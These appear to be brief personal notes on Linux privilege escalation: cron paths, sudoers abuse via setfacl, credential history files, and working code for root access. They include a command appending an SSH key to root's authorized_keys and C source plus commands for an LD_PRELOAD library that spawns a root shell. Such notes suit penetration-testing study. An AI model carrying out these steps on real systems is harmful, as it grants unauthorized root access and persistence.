# Cron Jobs
1. **`/etc/crontab`**
2. **`/etc/cron.d`**
3. **`/var/spool/cron/crontabs/root`**

# User Privileges
1. Sudo
2. SUID
3. Windows Token Privileges

### Sudoers
If the file `etc/sudoers` /could be made editable (for example using `setfacl`, add sudo privileges directly and `sudo su` to get root.
```bash
setfacl -m u:$USER:$perm /etc/sudoers
```
if `setfacl` can be run as sudo from low_priv user.
### Exposed Credentials
* bash_history
* mysql_history

# SSH Keys
If we have read/write access on **`.ssh`**  directory, we can get/create SSH connection.

Generate public-private key and paste the public in server
```bash
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
```

# [[Databases]]

# Environment Variables
## `env_keep+=LD_PRELOAD`
If we can run any one command as root with this environment variable, we can load our own malicious shared library here.
```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```shell-session
$ gcc -fPIC -shared -nostartfiles -o exploit.so exploit.c
$ sudo LD_PRELOAD=exploit.so <COMMAND>
```
